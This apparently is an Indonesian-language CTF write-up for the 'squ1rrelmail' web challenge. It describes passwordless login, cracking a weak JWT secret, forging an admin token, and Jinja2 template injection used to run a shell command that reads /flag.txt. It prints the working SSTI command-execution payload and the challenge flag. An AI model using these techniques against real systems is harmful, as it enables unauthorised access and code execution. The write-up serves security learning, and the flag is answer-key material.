# Writeup - web/squ1rrelmail

## Ringkasan
Challenge ini bisa diselesaikan dengan rantai eksploitasi berikut:
1. Akses endpoint tersembunyi `/login` dari komentar HTML halaman utama.
2. Login tanpa password menghasilkan JWT role `user`.
3. JWT ditandatangani `HS256` dengan secret lemah (`squirrel`) sehingga bisa di-crack dari token.
4. Forge token baru dengan `role=admin`.
5. Akses `/dashboard` sebagai admin, di-redirect ke `/acorn-inbox`.
6. Endpoint `/acorn-inbox` vulnerable SSTI (Jinja2) pada parameter `acorn`.
7. Gunakan SSTI untuk command execution dan baca `/flag.txt`.

Flag:

```text
squ1rrel{acorns_w3r3_n3v3r_m3ant_t0_b3_s3cr3t}
```

## Detail Langkah

### 1) Recon awal
Landing page `http://squ1rrelmail.squ1rrel.dev` hanya menampilkan halaman takedown.
Namun di source HTML ada komentar:

```html
<!-- TODO: disable /login endpoint before public takedown page goes live -->
```

Ini indikasi endpoint internal masih aktif.

### 2) Enumerasi dan login
Akses `/login` menampilkan form hanya dengan field `username`.
Submit username apa pun (`test`, `admin`, dsb.) selalu sukses dan memberi cookie `token=...` lalu redirect `/dashboard`.

JWT payload hasil decode berisi:
- `username`: nilai input
- `role`: `user`
- `exp`: timestamp expiry

### 3) Crack secret JWT
Algoritma token adalah `HS256`, jadi dengan mengetahui payload+signature bisa brute-force secret.
Dari wordlist tematik challenge, secret ketemu:

```text
squirrel
```

### 4) Privilege escalation ke admin
Setelah secret diketahui, buat JWT baru dengan payload:

```json
{"username":"admin","role":"admin","exp":<future_ts>}
```

Token admin valid. Saat dipakai ke `/dashboard`, server redirect ke endpoint moderator:

```text
/acorn-inbox
```

### 5) Uji SSTI di `/acorn-inbox`
Endpoint menerima query `acorn` dan me-render hasilnya di template.
Test payload:

```text
{{7*7}}
```

Output berubah menjadi `49`, konfirmasi SSTI Jinja2.

### 6) RCE via SSTI dan baca flag
Gunakan payload Jinja umum untuk akses `os.popen`:

```jinja2
{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}
```

Response mengembalikan:

```text
squ1rrel{acorns_w3r3_n3v3r_m3ant_t0_b3_s3cr3t}
```

## Solver
Solver otomatis ada di file:
- `solve.py`

Alur solver:
1. POST `/login` untuk ambil token user.
2. Crack secret JWT dari kandidat kata tematik.
3. Forge admin token.
4. Kirim payload SSTI ke `/acorn-inbox`.
5. Parse dan print flag.

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

## Catatan Vulnerability
- Broken Authentication: login tanpa password.
- Weak JWT Secret: secret mudah ditebak (`squirrel`).
- Privilege Escalation: role bergantung JWT yang bisa di-forge.
- SSTI (Jinja2): input user di-render langsung ke template.
- Command Injection via SSTI gadget: memungkinkan baca file sensitif (`/flag.txt`).
